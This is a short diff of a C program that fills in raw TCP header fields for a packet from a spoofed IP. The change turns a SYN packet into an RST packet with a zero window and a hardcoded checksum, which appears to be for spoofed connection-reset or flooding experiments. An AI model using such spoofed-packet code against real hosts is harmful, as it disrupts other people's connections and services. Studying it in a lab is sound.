@@ -83,16 +83,16 @@ int main (void)
 	//Fill in the tcp header fields
 	(*tcp_header).source = ip4_source_addr.sin_port;//Spoofed IP Port
 	(*tcp_header).dest = ip4_dest_addr.sin_port; //Real IP Port of server
-	(*tcp_header).seq = 0;
+	(*tcp_header).seq = 1;
 	(*tcp_header).ack_seq = 0;
 	(*tcp_header).doff = 5;	//tcp header size
 	(*tcp_header).urg=0;
 	(*tcp_header).ack=0;
 	(*tcp_header).psh=0;
-	(*tcp_header).rst=0;
-	(*tcp_header).syn=1;
+	(*tcp_header).rst=1;
+	(*tcp_header).syn=0;
 	(*tcp_header).fin=0;
-	(*tcp_header).window = htons(29200); //window size
+	(*tcp_header).window = htons(0); //window size
 	(*tcp_header).check = 0x6de5; //Calculated correct checksum (with help of wireshark)
 	(*tcp_header).urg_ptr = 0;
 	
